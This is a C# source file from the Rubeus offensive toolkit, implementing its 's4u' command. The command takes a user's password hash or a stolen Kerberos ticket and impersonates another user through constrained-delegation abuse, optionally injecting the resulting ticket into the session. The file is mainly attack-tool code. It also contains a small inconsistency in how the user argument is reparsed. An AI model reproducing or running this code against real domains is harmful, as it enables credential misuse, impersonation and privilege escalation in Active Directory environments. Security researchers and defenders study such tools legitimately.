using System;
using System.Collections.Generic;
using System.IO;
using System.Net.NetworkInformation;

namespace Rubeus.Commands
{
    public class S4u : ICommand
    {
        public static string CommandName => "s4u";

        public void Execute(Dictionary<string, string> arguments)
        {
            string user = "";
            string domain = "";
            string hash = "";
            Interop.KERB_ETYPE encType;

            string userValue;
            if (arguments.TryGetValue("/user", out userValue)) {
                string[] parts = userValue.Split('\\');
                switch (parts.Length) {
                    case 1:
                        user = userValue;
                        break;
                    case 2:
                        domain = parts[0];
                        user = parts[1];
                        break;
                    default:
                        Console.WriteLine("\r\n[X] Invalid user syntax!\r\n");
                        return;
                }
            }
            if (arguments.ContainsKey("/domain")) {
                domain = arguments["/domain"];
            }
            bool ptt = arguments.ContainsKey("/ptt");
            string dc = arguments.GetArgument("/dc", string.Empty);
            if (arguments.TryGetValue("/rc4", out hash)) {
                encType = Interop.KERB_ETYPE.rc4_hmac;
            }
            else if (arguments.TryGetValue("/aes256", out hash)) {
                encType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
            }
            else {
                encType = Interop.KERB_ETYPE.subkey_keymaterial; // throwaway placeholder, changed to something valid
            }
            string targetUser = arguments.GetArgument("/impersonateuser");
            if (string.IsNullOrEmpty(targetUser)) {
                Console.WriteLine("\r\n[X] You must supply a /impersonateuser to impersonate!\r\n");
                return;
            }
            string targetSPN = arguments.GetArgument("/msdsspn");
            if (string.IsNullOrEmpty(targetSPN)) {
                Console.WriteLine("\r\n[X] You must supply a /msdsspn !\r\n");
                return;
            }
            string altSname = arguments.GetArgument("/altservice", string.Empty);
            if (string.IsNullOrEmpty(domain)) {
                domain = IPGlobalProperties.GetIPGlobalProperties().DomainName;
            }
            if (arguments.ContainsKey("/ticket")) {
                string kirbi64 = arguments.GetArgument("/ticket");
                byte[] asnElementBody;

                if (Helpers.IsBase64String(kirbi64)) {
                    asnElementBody = Convert.FromBase64String(kirbi64);
                }
                else if (File.Exists(kirbi64)) {
                    asnElementBody = File.ReadAllBytes(kirbi64);
                }
                else {
                    Console.WriteLine("\r\n[X] /ticket:X must either be a .kirbi file or a base64 encoded .kirbi\r\n");
                    return;
                }
                S4U.Execute(new KRB_CRED(asnElementBody), targetUser, targetSPN, ptt, dc, altSname);
                return;
            }
            if (arguments.ContainsKey("/user")) {
                // if the caller is supplying a user and rc4/aes256 hash to first execute a TGT request
                user = arguments["/user"];
                if (string.IsNullOrEmpty(hash)) {
                    Console.WriteLine("\r\n[X] You must supply a /rc4 or /aes256 hash!\r\n");
                    return;
                }
                S4U.Execute(user, domain, hash, encType, targetUser, targetSPN, ptt, dc, altSname);
                return;
            }
            Console.WriteLine("\r\n[X] A /ticket:X needs to be supplied for S4U!\r\n");
            Console.WriteLine("[X] Alternatively, supply a /user and </rc4:X | /aes256:X> hash to first retrieve a TGT.\r\n");
        }
    }
}